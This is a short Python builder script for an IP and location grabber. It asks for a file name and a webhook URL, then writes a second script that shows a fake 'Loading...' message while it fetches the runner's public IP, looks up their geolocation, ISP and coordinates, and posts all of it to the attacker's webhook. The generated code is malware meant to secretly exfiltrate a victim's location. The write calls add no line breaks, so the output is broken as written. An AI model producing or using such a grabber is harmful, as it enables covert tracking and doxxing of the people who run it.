import requests


name = input("Enter File Name: ")
while True:
	try:
		webhook = input("Enter Webhook: ")
		r = requests.get(webhook)
		if "200" in str(r):
			break
		if "200" not in str(r):
			print("Webhook Invalid")
	except Exception:
		print("Webhook Invalid")
file = open(f"{name}.py", "a")
file.write('import requests, json')
file.write('print("Loading...")')
file.write(f'webhook = "{webhook}"')
file.write('url = "https://api.ipify.org"')
file.write('r = requests.get(url).text')
file.write('r = str(r)')
file.write('r2 = requests.get(f"http://ip-api.com/json/{r}").json()')
file.write('i1 = "Country: " + r2["country"]')
file.write('i2 = "Country Code: " + r2["countryCode"]')
file.write('i3 = "Region Name: " + r2["regionName"]')
file.write('i4 = "City: " + r2["city"]')
file.write('i5 = "Zip Code: " + r2["zip"]')
file.write('i6 = "Lat: " + str(r2["lat"])')
file.write('i7 = "Lon: " + str(r2["lon"])')
file.write('i8 = "Timezone: " + r2["timezone"]')
file.write('i9 = "ISP: " + r2["isp"]')
file.write('i10 = "Org: " + r2["org"]')
file.write('i11 = "AS: " + r2["as"]')
file.write('i12 = "Country: " + r2["country"]')
file.write('r = requests.post(webhook, json={"content": f"@everyone ```Ip: {r}	|	{i1}	|	{i2}	|	{i3}	|	{i4}	|	{i5}	|	{i6}	|	{i7}	|	{i8}	|	{i9}	|	{i10}	|	{i11}	|	{i12}```"})')
file.close()
print("Done")
input("")
exit()
